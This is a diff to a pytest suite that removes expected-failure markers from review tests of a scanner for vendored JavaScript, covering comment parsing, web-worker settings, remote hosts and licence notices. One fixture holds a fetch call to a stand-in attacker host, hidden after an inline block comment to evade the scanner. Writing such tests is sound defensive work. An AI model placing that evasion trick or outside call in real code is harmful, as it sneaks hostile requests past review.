@@ -30,7 +30,6 @@ def _vendored(tmp_path: Path, files: dict[str, str]) -> Path:
 
 
 @pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
-@pytest.mark.xfail(strict=True, reason="R1: a line opening with /* */ is dropped")
 def test_review370_code_after_an_inline_block_comment_is_scanned(tmp_path: Path) -> None:
     """`_code` drops any line starting with `/*` that also closes it: the code after is lost."""
     _vendored(tmp_path, {"newfile.js": '/**/ fetch("https://evil.example.test/x")\n'})
@@ -43,7 +42,6 @@ def test_review370_code_after_an_inline_block_comment_is_scanned(tmp_path: Path)
 
 
 @pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
-@pytest.mark.xfail(strict=True, reason="R2: a later useWebWorkers: true passes")
 def test_review370_a_later_configure_cannot_turn_zip_workers_back_on(tmp_path: Path) -> None:
     """The guard looks for one `configure({ useWebWorkers: false` line; `\\bWorker\\b` does not
     match `useWebWorkers`, so a second call with `true` is counted nowhere."""
@@ -58,7 +56,6 @@ def test_review370_a_later_configure_cannot_turn_zip_workers_back_on(tmp_path: P
 
 
 @pytest.mark.req("EF-LEC-003", "ENF-SEC-004")
-@pytest.mark.xfail(strict=True, reason="R3: vendor/ extensionless and .css unchecked")
 @pytest.mark.parametrize(
     "files",
     [
@@ -81,7 +78,6 @@ def test_review370_vendor_refuses_unpinned_code_and_remote_hosts(
 
 
 @pytest.mark.req("EF-LEC-003")
-@pytest.mark.xfail(strict=True, reason="R4: SJCL undeclared, MIT/BSD texts absent")
 def test_review370_notices_cover_sjcl_and_carry_the_bundle_licence_texts() -> None:
     """vendor/zip.js is zip-core 2.8.22, which bundles SJCL (AES and PBKDF2, `invalid aes key
     size`): Stanford, BSD or GPL-2.0, a notice of its own. The bundles are minified without
@@ -102,7 +98,6 @@ def test_review370_notices_cover_sjcl_and_carry_the_bundle_licence_texts() -> No
 
 
 @pytest.mark.req("EF-LEC-003")
-@pytest.mark.xfail(strict=True, reason="R5: zip-core needs Safari 16.4, ADR says 16.1")
 def test_review370_adr_safari_floor_matches_the_pinned_zip_bundle() -> None:
     """foliate builds vendor/zip.js from `zip-core.js` (no JavaScript inflate codec) and turns the
     workers off: a deflated EPUB needs the native `DecompressionStream('deflate-raw')`, which
